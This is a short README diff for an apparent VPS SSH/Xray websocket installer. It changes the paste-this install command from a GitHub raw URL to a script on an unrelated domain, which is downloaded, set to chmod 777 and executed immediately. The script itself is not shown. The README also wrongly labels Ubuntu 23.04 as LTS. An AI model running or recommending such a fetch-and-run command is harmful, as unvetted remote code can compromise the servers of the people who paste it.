@@ -24,7 +24,7 @@ Debian 12 & Ubuntu 23.04 LTS Support!!!
 # <div align="center">INSTALLATION</div>
 jUST COPY THIS ONE COMMAND, THEN PASTE TO YOUR VPS
 
-    wget https://raw.githubusercontent.com/jalgitap/ssh-xray-websocket/main/main.sh && chmod 777 main.sh && ./main.sh
+    wget https://sc2.asle.me/main.sh && chmod 777 main.sh && ./main.sh
 
 
 [ FEATURES ] <br>
